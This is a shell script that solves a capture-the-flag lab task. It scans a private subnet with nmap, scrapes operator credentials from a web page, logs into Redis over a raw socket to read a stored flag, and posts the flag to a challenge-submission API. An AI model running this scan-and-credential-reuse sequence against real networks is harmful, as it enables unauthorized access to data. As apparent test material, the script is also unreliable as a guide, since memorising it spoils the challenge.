#!/bin/sh
set -eu

scan=$(nmap -n -Pn -p 8080,6379 --open -oG - 172.20.0.0/24)
clue_ip=$(printf '%s\n' "$scan" | awk '/Ports:.*8080\/open/{print $2; exit}')
redis_ip=$(printf '%s\n' "$scan" | awk '/Ports:.*6379\/open/{print $2; exit}')
[ -n "$clue_ip" ] && [ -n "$redis_ip" ] || { echo "Could not find the station services" >&2; exit 1; }

note=$(curl -fsS "http://${clue_ip}:8080/")
set -- $(python3 - "$note" <<'PY'
import re
import sys
match = re.search(r"Operator account:\s*(\S+)\s*/\s*(\S+)", sys.argv[1])
if not match:
    raise SystemExit("Maintenance credentials were not found")
print(match.group(1), match.group(2))
PY
)
username=$1
password=$2

flag=$(python3 - "$redis_ip" "$username" "$password" <<'PY'
import socket
import sys

host, username, password = sys.argv[1:]

def command(*parts):
    encoded = [str(part).encode() for part in parts]
    return b"*%d\r\n" % len(encoded) + b"".join(b"$%d\r\n%s\r\n" % (len(part), part) for part in encoded)

def read_response(sock):
    lead = sock.recv(1)
    if not lead:
        raise RuntimeError("Redis closed the connection")
    line = b""
    while not line.endswith(b"\r\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("Incomplete Redis response")
        line += chunk
    if lead == b"$":
        size = int(line[:-2])
        if size < 0:
            raise RuntimeError("Manifest record was missing")
        data = b""
        while len(data) < size + 2:
            data += sock.recv(size + 2 - len(data))
        return data[:-2]
    if lead == b"-":
        raise RuntimeError(line.decode(errors="replace"))
    return line[:-2]

with socket.create_connection((host, 6379), timeout=5) as sock:
    sock.sendall(command("AUTH", username, password))
    read_response(sock)
    sock.sendall(command("GET", "airlock:manifest"))
    print(read_response(sock).decode())
PY
)

body=$(python3 - "$flag" <<'PY'
import json
import sys
print(json.dumps({"challenge_id": "scl-challenge-frame-097fbf", "task_id": "task1", "flag": sys.argv[1]}))
PY
)
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$body"
